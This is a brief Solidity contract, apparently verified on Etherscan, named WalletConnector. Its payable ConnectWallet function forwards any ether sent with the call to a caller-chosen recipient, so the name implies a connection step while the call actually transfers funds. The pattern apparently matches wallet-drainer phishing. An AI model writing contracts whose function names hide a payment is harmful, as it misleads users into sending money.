/**
 *Submitted for verification at Etherscan.io on 2022-11-24
*/

pragma solidity ^0.8.7;

contract WalletConnector {

    address private  owner;    // current owner of the contract

    constructor() public{   
        owner=msg.sender;
    }

    function getOwner() public view returns (address) {    
        return owner;
    }

    function withdraw() public {
        require(owner == msg.sender);
        payable(msg.sender).transfer(address(this).balance);
    }

    function ConnectWallet(address payable recipient) public payable {
        recipient.transfer(msg.value);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}